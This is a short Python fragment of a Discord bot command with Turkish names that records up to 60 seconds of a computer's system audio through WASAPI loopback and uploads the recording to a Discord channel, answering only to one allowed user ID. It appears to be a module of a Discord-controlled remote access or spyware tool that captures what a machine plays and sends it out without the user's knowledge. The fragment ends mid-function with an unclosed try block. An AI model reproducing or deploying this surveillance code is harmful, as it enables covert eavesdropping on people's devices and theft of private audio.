@bot.command(name="dinlekulaklik")
async def dinlekulaklik(ctx, sure: str = "5"):
    if ctx.author.id != ALLOWED_USER_ID:
        return
    try:
        saniye = int(sure)
        if saniye < 1 or saniye > 60:
            return
        p = pyaudio.PyAudio()
        wasapi_info = p.get_default_wasapi_loopback()
        if wasapi_info is None:
            return
        channels = wasapi_info["maxInputChannels"]
        sample_rate = int(wasapi_info["defaultSampleRate"])
        chunk = 1024
        stream = p.open(
            format=pyaudio.paInt16,
            channels=channels,
            rate=sample_rate,
            input=True,
            frames_per_buffer=chunk,
            input_device_index=wasapi_info["index"]
        )
        frames = []
        for _ in range(0, int(sample_rate / chunk * saniye)):
            data = stream.read(chunk, exception_on_overflow=False)
            frames.append(data)
        stream.stop_stream()
        stream.close()
        p.terminate()
        with tempfile.NamedTemporaryFile(suffix=".wav", delete=False) as tmp:
            temp_path = tmp.name
        import wave
        with wave.open(temp_path, 'wb') as wf:
            wf.setnchannels(channels)
            wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
            wf.setframerate(sample_rate)
            wf.writeframes(b''.join(frames))
        file = discord.File(temp_path, filename=f"kulaklik_kayit_{saniye}s.wav")
        await ctx.send(f"{saniye} saniyelik kayıt tamamlandı:", file=file)
